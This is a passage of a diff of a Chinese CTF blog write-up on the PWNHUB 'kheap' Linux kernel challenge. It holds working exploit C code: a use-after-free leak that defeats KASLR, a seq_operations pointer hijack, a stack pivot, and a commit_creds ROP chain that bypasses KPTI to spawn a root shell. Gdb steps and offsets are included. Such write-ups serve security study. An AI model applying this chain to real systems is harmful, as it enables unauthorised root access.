data-num="103"></td><td><pre>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>recv<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>  </pre></td></tr><tr><td data-num="105"></td><td><pre>  <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>  <span class="token function">choose</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>  <span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 释放了大小为 0x20 的堆 heap</span></pre></td></tr><tr><td data-num="108"></td><td><pre>  </pre></td></tr><tr><td data-num="109"></td><td><pre>  <span class="token keyword">int</span> seq_fd<span class="token operator">=</span><span class="token function">seq_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 调用 seq_open，会创建 0x20 大小的堆来保存 seq_operations</span></pre></td></tr><tr><td data-num="110"></td><td><pre>  </pre></td></tr><tr><td data-num="111"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>recv<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>  </pre></td></tr><tr><td data-num="113"></td><td><pre>  <span class="token class-name">uint64_t</span> kernel_base<span class="token operator">=</span>recv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x33F980</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>  <span class="token class-name">uint64_t</span> prepare_kernel_cred<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0xcebf0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>  <span class="token class-name">uint64_t</span> commit_creds<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0xce710</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>  <span class="token class-name">uint64_t</span> kpti_trampoline<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0xc00fb0</span><span class="token punctuation">;</span>   <span class="token comment">// 会同时绕过 kpti，然后执行 swapg 和 retq</span></pre></td></tr><tr><td data-num="117"></td><td><pre>  <span class="token class-name">uint64_t</span> seq_read<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0x340560</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>  <span class="token class-name">uint64_t</span> pop_rdi<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0x2517a</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>  <span class="token class-name">uint64_t</span> mov_rdi_rax<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0x5982f4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>  <span class="token class-name">uint64_t</span> gadget<span class="token operator">=</span>kernel_base<span class="token operator">+</span><span class="token number">0x94a10</span><span class="token punctuation">;</span>  <span class="token comment">//0xffffffff81094a10 : xchg esp, eax ; ret</span></pre></td></tr><tr><td data-num="121"></td><td><pre>  </pre></td></tr><tr><td data-num="122"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kernel_base: 0x%lx\n"</span><span class="token punctuation">,</span>kernel_base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] prepare_kernel_cred: 0x%lx\n"</span><span class="token punctuation">,</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] commit_creds: 0x%lx\n"</span><span class="token punctuation">,</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>  </pre></td></tr><tr><td data-num="126"></td><td><pre>  <span class="token comment">//gadget&amp;0xFFFFF000=> 地址对齐</span></pre></td></tr><tr><td data-num="127"></td><td><pre>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>mmap_addr<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>gadget<span class="token operator">&amp;</span><span class="token number">0xFFFFF000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>PAGE_SIZE<span class="token punctuation">,</span>PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token operator">|</span>PROT_EXEC<span class="token punctuation">,</span>MAP_ANONYMOUS<span class="token operator">|</span>MAP_SHARED<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] mmap_addr: 0x%lx\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>mmap_addr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>  </pre></td></tr><tr><td data-num="130"></td><td><pre>  <span class="token comment">//((char *) mmap_addr)+0xa10 => 得到 gadget 地址的低 4 字节</span></pre></td></tr><tr><td data-num="131"></td><td><pre>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>ROP<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>mmap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xa10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>pop_rdi<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>prepare_kernel_cred<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="135"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>kpti_trampoline<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>   </pre></td></tr><tr><td data-num="137"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>get_shell<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>user_eflag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="142"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="143"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>ROP<span class="token operator">+</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="144"></td><td><pre>  </pre></td></tr><tr><td data-num="145"></td><td><pre>  <span class="token function">memcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>recv<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="146"></td><td><pre>  buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>gadget<span class="token punctuation">;</span>        <span class="token comment">// 劫持 seq_ops 的.start 函数指针</span></pre></td></tr><tr><td data-num="147"></td><td><pre>  <span class="token function">write</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 把一开始泄露的地址重新写回 select</span></pre></td></tr><tr><td data-num="148"></td><td><pre>  <span class="token function">read</span><span class="token punctuation">(</span>seq_fd<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="149"></td><td><pre></pre></td></tr><tr><td data-num="150"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="151"></td><td><pre><span class="token comment">/*</pre></td></tr><tr><td data-num="152"></td><td><pre>0xffffffff81000000</pre></td></tr><tr><td data-num="153"></td><td><pre>0xffffa09b42945120</pre></td></tr><tr><td data-num="154"></td><td><pre>0x33F980</pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>0xffffffff8112a6de : xchg eax, esp ; ret</pre></td></tr><tr><td data-num="157"></td><td><pre>0xffffffff81094a10 : xchg esp, eax ; ret</pre></td></tr><tr><td data-num="158"></td><td><pre>利用 xchg eax, esp 这个位于内核的 gadget，将栈转移到用户态低 32 位地址相同的地方。这个时候，我们只需要提前在这个位置布置上我们的 gadgets，就能达到提权的效果。</pre></td></tr><tr><td data-num="159"></td><td><pre>注意：xchg eax, esp 将清空两个寄存器的高位部分。因此执行完成后，% rsp 的高四字节为 0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</pre></td></tr><tr><td data-num="160"></td><td><pre></pre></td></tr><tr><td data-num="161"></td><td><pre>file ./vmlinux</pre></td></tr><tr><td data-num="162"></td><td><pre>add-symbol-file ./vmlinux 0xffffffff81000000</pre></td></tr><tr><td data-num="163"></td><td><pre>add-symbol-file ./kheap.ko  0xffffffffc0002000</pre></td></tr><tr><td data-num="164"></td><td><pre>target remote 0.0.0.0:1234</pre></td></tr><tr><td data-num="165"></td><td><pre>*/</span></pre></td></tr></table></figure><h4 id="绕过kaslr保护"><a class="markdownIt-Anchor" href="#绕过kaslr保护">#</a> 绕过 kaslr 保护</h4>
 <p>泄漏地址之前，可以进行以下操作之一，为了方便找到偏移</p>
 <ul>
 <li>
-<p>将启动脚本中的<code>kaslr</code>选项去掉，改为<code>nokaslr</code>，那么之后泄漏出来的地址减去<code>0xffffffff81000000</code>就可以得到偏移</p>
+<p>将启动脚本中的 <code>kaslr</code>  选项去掉，改为 <code>nokaslr</code> ，那么之后泄漏出来的地址减去 <code>0xffffffff81000000</code>  就可以得到偏移</p>
 </li>
 <li>
-<p>在解压的rootfs中的初始化脚本<code>init</code>中，以root用户启动，然后查看<code>/proc/xxx</code>，找到基地址base，UAF泄漏地址后减去base即可得到偏移。同时可以用lsmod查看keap.ko加载的地址，方便后续调试</p>
-<img data-src="/images/linux-kernel-pwn13.jpg" style="zoom:80%;" />
+<p>在解压的 rootfs 中的初始化脚本 <code>init</code>  中，以 root 用户启动，然后查看 <code>/proc/xxx</code> ，找到基地址 base，UAF 泄漏地址后减去 base 即可得到偏移。同时可以用 lsmod 查看 keap.ko 加载的地址，方便后续调试</p>
+<p><img data-src="/images/linux-kernel-pwn13.jpg" alt=""></p>
 </li>
 </ul>
-<p>接着触发UAF，在kheap_read中</p>
-<img data-src="/images/linux-kernel-pwn6.jpg" style="zoom:80%;" />
-<p>可以把select保存的地址读到用户空间buf中，通过gdb调试，把keap.ko的符号表载入到gdb中然后在kheap_read下断点</p>
-<img data-src="/images/linux-kernel-pwn14.jpg" style="zoom:80%;" />
-<p>这样就可以得到泄漏的地址的偏移为<code>0x33f980</code>，然后就可以得到基地址了</p>
-<h4 id="绕过kpti保护"><a class="markdownIt-Anchor" href="#绕过kpti保护"></a> 绕过kpti保护</h4>
-<p>把控制流劫持到函数<code>swapgs_restore_regs_and_return_to_usermode</code>，这里一方面会绕过kpti保护(即修改cr3寄存器的值)，另一方面会切换回用户态，即调用swapgs和iretq，这样我们可以在回到用户态的时候劫持rip去getshell</p>
-<p>不需要从这个函数开头开始执行，从<code>mov rsp,gs:qword 6004</code>开始即可</p>
-<img data-src="/images/linux-kernel-pwn10.jpg" style="zoom:80%;" />
-<h4 id="劫持seq_operations"><a class="markdownIt-Anchor" href="#劫持seq_operations"></a> 劫持seq_operations</h4>
-<p>又是释放的堆大小为0x20，而为了劫持控制流，故考虑修改seq_operations结构体的函数指针。</p>
-<p>seq_operations结构体大小为0x20</p>
-<pre class="highlight"><code class="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span>
-    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos); <span class="hljs-comment">//开始读数据项，通常需要在这个函数中加锁，以防止并行访问数据</span>
-    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v); <span class="hljs-comment">//停止数据项，和start相对，通常需要解锁</span>
-    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos); <span class="hljs-comment">//下一个要处理的数据项</span>
-    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v); <span class="hljs-comment">//打印数据项到临时缓冲区</span>
-&#125;;
-</code></pre>
-<p>这个结构体设计出来是为了简化为/proc文件的读写操作而设计的</p>
-<p>打开<code>/proc/self/stat</code>文件的时候，会申请出seq_operations结构体，而申请出的结构体就在之前释放的堆上，保存在了select全局变量中，那么之后我们利用UAF，通过kheap_write函数，就可以修改这个seq_operations结构体的函数指针，然后调用read读即可调用函数指针，从而劫持控制流</p>
-<p>打开<code>/proc/self/stat</code>文件时，会先调用<code>single_open()</code>函数去初始化seq_operations结构体</p>
-<img data-src="/images/linux-kernel-pwn20.jpg" style="zoom:80%;" />
-<p>将vmlinux的符号表导入gdb中，建议关闭kaslr调试，这样就可以指定起始地址为<code>0xffffffff81000000</code>方便调试，在single_open下断点</p>
-<img data-src="/images/linux-kernel-pwn18.jpg" style="zoom:80%;" />
-<p>可以发现确实创建了0x20大小的堆，然后申请堆用来分配seq_operations结构体</p>
-<p><img data-src="/images/linux-kernel-pwn19.jpg" alt="" /></p>
-<p>记录在single_open申请出来堆地址，然后在kheap_read下断点，然后到达调用copy_to_user处，rsi保存的就是select的值，即之前UAF的堆地址，可以发现这两者一样</p>
-<img data-src="/images/linux-kernel-pwn21.jpg" style="zoom:80%;" />
-<p>这样，就把seq_operations结构体劫持到了select上，之后利用kheap_write修改函数指针即可</p>
-<h4 id="函数偏移"><a class="markdownIt-Anchor" href="#函数偏移"></a> 函数偏移</h4>
+<p>接着触发 UAF，在 kheap_read 中</p>
+<p><img data-src="/images/linux-kernel-pwn6.jpg" alt=""></p>
+<p>可以把 select 保存的地址读到用户空间 buf 中，通过 gdb 调试，把 keap.ko 的符号表载入到 gdb 中然后在 kheap_read 下断点</p>
+<p><img data-src="/images/linux-kernel-pwn14.jpg" alt=""></p>
+<p>这样就可以得到泄漏的地址的偏移为 <code>0x33f980</code> ，然后就可以得到基地址了</p>
+<h4 id="绕过kpti保护"><a class="markdownIt-Anchor" href="#绕过kpti保护">#</a> 绕过 kpti 保护</h4>
+<p>把控制流劫持到函数 <code>swapgs_restore_regs_and_return_to_usermode</code> ，这里一方面会绕过 kpti 保护 (即修改 cr3 寄存器的值)，另一方面会切换回用户态，即调用 swapgs 和 iretq，这样我们可以在回到用户态的时候劫持 rip 去 getshell</p>
+<p>不需要从这个函数开头开始执行，从 <code>mov rsp,gs:qword 6004</code>  开始即可</p>
+<p><img data-src="/images/linux-kernel-pwn10.jpg" alt=""></p>
+<h4 id="劫持seq_operations"><a class="markdownIt-Anchor" href="#劫持seq_operations">#</a> 劫持 seq_operations</h4>
+<p>又是释放的堆大小为 0x20，而为了劫持控制流，故考虑修改 seq_operations 结构体的函数指针。</p>
+<p>seq_operations 结构体大小为 0x20</p>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">seq_operations</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>start<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 开始读数据项，通常需要在这个函数中加锁，以防止并行访问数据</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>stop<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 停止数据项，和 start 相对，通常需要解锁</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>next<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 下一个要处理的数据项</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>show<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印数据项到临时缓冲区</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这个结构体设计出来是为了简化为 /proc 文件的读写操作而设计的</p>
+<p>打开 <code>/proc/self/stat</code>  文件的时候，会申请出 seq_operations 结构体，而申请出的结构体就在之前释放的堆上，保存在了 select 全局变量中，那么之后我们利用 UAF，通过 kheap_write 函数，就可以修改这个 seq_operations 结构体的函数指针，然后调用 read 读即可调用函数指针，从而劫持控制流</p>
+<p>打开 <code>/proc/self/stat</code>  文件时，会先调用 <code>single_open()</code>  函数去初始化 seq_operations 结构体</p>
+<p><img data-src="/images/linux-kernel-pwn20.jpg" alt=""></p>
+<p>将 vmlinux 的符号表导入 gdb 中，建议关闭 kaslr 调试，这样就可以指定起始地址为 <code>0xffffffff81000000</code>  方便调试，在 single_open 下断点</p>
+<p><img data-src="/images/linux-kernel-pwn18.jpg" alt=""></p>
+<p>可以发现确实创建了 0x20 大小的堆，然后申请堆用来分配 seq_operations 结构体</p>
+<p><img data-src="/images/linux-kernel-pwn19.jpg" alt=""></p>
+<p>记录在 single_open 申请出来堆地址，然后在 kheap_read 下断点，然后到达调用 copy_to_user 处，rsi 保存的就是 select 的值，即之前 UAF 的堆地址，可以发现这两者一样</p>
+<p><img data-src="/images/linux-kernel-pwn21.jpg" alt=""></p>
+<p>这样，就把 seq_operations 结构体劫持到了 select 上，之后利用 kheap_write 修改函数指针即可</p>
+<h4 id="函数偏移"><a class="markdownIt-Anchor" href="#函数偏移">#</a> 函数偏移</h4>
 <p>首先需要提权，考虑使用</p>
-<pre class="highlight"><code class="c">commit_creds(prepare_kernel_cred(<span class="hljs-number">0</span>))
-</code></pre>
-<p>在vmlinux找到对应函数的地址，还有<code>pop rdi;ret</code>的gadget</p>
-<p>commit_creads函数：</p>
-<img data-src="/images/linux-kernel-pwn3.jpg" style="zoom:80%;" />
-<p>prepare_kernel_cread函数：</p>
-<img data-src="/images/linux-kernel-pwn1.jpg" style="zoom:80%;" />
-<p>pop rdi; ret ：(这里我使用ROPgadget，没有使用ropper，感觉ROPgadget也不是很慢)</p>
-<img data-src="/images/linux-kernel-pwn9.jpg" style="zoom:80%;" />
-<p>得到地址之后均减去<code>0xffffffff81000000</code>即可得到对应的偏移</p>
-<h4 id="提权getshell"><a class="markdownIt-Anchor" href="#提权getshell"></a> 提权getshell</h4>
-<p>为了利用ROP，我们需要把在处于内核态的时候，把rsp劫持到用户态上，因为我们的ROP是保存在用户态上的，这需要用到一个gadget指令</p>
-<pre class="highlight"><code class="asm">xchg esp, eax ; ret
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>在 vmlinux 找到对应函数的地址，还有 <code>pop rdi;ret</code>  的 gadget</p>
+<p>commit_creads 函数：</p>
+<p><img data-src="/images/linux-kernel-pwn3.jpg" alt=""></p>
+<p>prepare_kernel_cread 函数：</p>
+<p><img data-src="/images/linux-kernel-pwn1.jpg" alt=""></p>
+<p>pop rdi; ret ：(这里我使用 ROPgadget，没有使用 ropper，感觉 ROPgadget 也不是很慢)</p>
+<p><img data-src="/images/linux-kernel-pwn9.jpg" alt=""></p>
+<p>得到地址之后均减去 <code>0xffffffff81000000</code>  即可得到对应的偏移</p>
+<h4 id="提权getshell"><a class="markdownIt-Anchor" href="#提权getshell">#</a> 提权 getshell</h4>
+<p>为了利用 ROP，我们需要把在处于内核态的时候，把 rsp 劫持到用户态上，因为我们的 ROP 是保存在用户态上的，这需要用到一个 gadget 指令</p>
+<pre><code class="language-asm">xchg esp, eax ; ret
 </code></pre>
 <p>利用 xchg eax, esp 这个位于内核的 gadget，将栈转移到用户态低 32 位地址相同的地方。这个时候，我们只需要提前在这个位置布置上我们的 gadgets，就能达到提权的效果。</p>
-<p>注意：xchg eax, esp将清空两个寄存器的高位部分。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
-<p>在vmlinux的ROP中找到对应的gadget，然后劫持seq_operations的函数指针到这里，然后改变rsp到用户态栈，接着就执行ret指令了</p>
-<pre class="highlight"><code class="">0xffffffff81094a10 : xchg esp, eax ; ret
+<p>注意：xchg eax, esp 将清空两个寄存器的高位部分。因此执行完成后，% rsp 的高四字节为 0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
+<p>在 vmlinux 的 ROP 中找到对应的 gadget，然后劫持 seq_operations 的函数指针到这里，然后改变 rsp 到用户态栈，接着就执行 ret 指令了</p>
+<pre><code>0xffffffff81094a10 : xchg esp, eax ; ret
 </code></pre>
-<p>先调用kheap_write去修改seq_operations的函数指针</p>
-<img data-src="/images/linux-kernel-pwn22.jpg" style="zoom:80%;" />
-<p>然后调用read去读<code>/porc/self/stat</code>，出发seq_operations的函数指针。在<code>0xffffffff81094a10</code>(即改变rsp到用户态栈上)下断点</p>
-<img data-src="/images/linux-kernel-pwn23.jpg" style="zoom:80%;" />
-<img data-src="/images/linux-kernel-pwn24.jpg" style="zoom:80%;" />
-<p>执行完后发现rsp确实到用户态上了</p>
-<img data-src="/images/linux-kernel-pwn/25.jpg" style="zoom:80%;" />
-<p>然后就是我们的ROP链了，接着就提权成功了</p>
+<p>先调用 kheap_write 去修改 seq_operations 的函数指针</p>
+<p><img data-src="/images/linux-kernel-pwn22.jpg" alt=""></p>
+<p>然后调用 read 去读 <code>/porc/self/stat</code> ，出发 seq_operations 的函数指针。在 <code>0xffffffff81094a10</code>  (即改变 rsp 到用户态栈上) 下断点</p>
+<p><img data-src="/images/linux-kernel-pwn23.jpg" alt=""></p>
+<p><img data-src="/images/linux-kernel-pwn24.jpg" alt=""></p>
+<p>执行完后发现 rsp 确实到用户态上了</p>
+<p><img data-src="/images/linux-kernel-pwn/25.jpg" alt=""></p>
+<p>然后就是我们的 ROP 链了，接着就提权成功了</p>
 
       <div class="tags">
           <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
@@ -412,7 +237,7 @@ target remote 0.0.0.0:1234
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2023-10-04 23:14:17" itemprop="dateModified" datetime="2023-10-04T23:14:17+08:00">2023-10-04</time>
+    <time title="Modified: 2023-10-04 23:18:35" itemprop="dateModified" datetime="2023-10-04T23:18:35+08:00">2023-10-04</time>
   </span>
 </div>
 
@@ -467,7 +292,7 @@ target remote 0.0.0.0:1234
     <div class="item left">
       
 
-  <a href="/2023/04/16/house-of-pig/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesx5fdwj20zk0m81kx.jpg" title="house_of_pig">
+  <a href="/2023/04/16/house-of-pig/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuv0socj20zk0m8qes.jpg" title="house_of_pig">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>house_of_pig</h3>
@@ -491,7 +316,7 @@ target remote 0.0.0.0:1234
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnhub-kheap"><span class="toc-number">1.</span> <span class="toc-text"> PWNHUB-kheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 保护与漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text"> 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kaslr%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 绕过kaslr保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 绕过kpti保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81seq_operations"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 劫持seq_operations</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 